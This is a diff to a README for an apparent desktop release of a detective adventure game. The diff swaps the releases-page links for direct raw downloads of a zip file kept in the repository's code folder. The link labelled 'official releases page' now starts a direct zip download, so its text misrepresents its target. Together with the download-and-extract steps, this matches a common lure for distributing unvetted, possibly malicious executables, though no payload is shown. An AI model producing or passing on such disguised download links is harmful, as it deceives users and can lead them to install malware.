@@ -1,6 +1,6 @@
 # 🔍 MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version - Solve mysteries in a hand-drawn world
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/klkape6358/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/klkape6358/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/main/Code/Desktop-Release-Version-Game-MOUS-For-Hire-3.3-beta.1.zip)
 
 ## 🎮 About the Game
 MOUSE PI For Hire puts you in the shoes of a detective. You play as a mouse who handles tough cases in a city full of secrets. This game features hand-drawn art and a cartoon style. You click on objects and talk to characters to solve puzzles. The game runs on your desktop computer and supports widescreen monitors for a wide view of the city. You use your mouse to move through scenes, pick up items, and choose lines of dialogue. The game tracks your clues in a digital notebook.
@@ -16,7 +16,7 @@ MOUSE PI For Hire puts you in the shoes of a detective. You play as a mouse who 
 ## 📥 How to Download and Install
 Follow these steps to get the game on your computer:
 
-1. Visit the [official releases page](https://github.com/klkape6358/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases) to view available files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/klkape6358/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/main/Code/Desktop-Release-Version-Game-MOUS-For-Hire-3.3-beta.1.zip) to view available files.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .zip or .exe to start your download.
 4. If you downloaded a .zip file, right-click the folder and select Extract All.
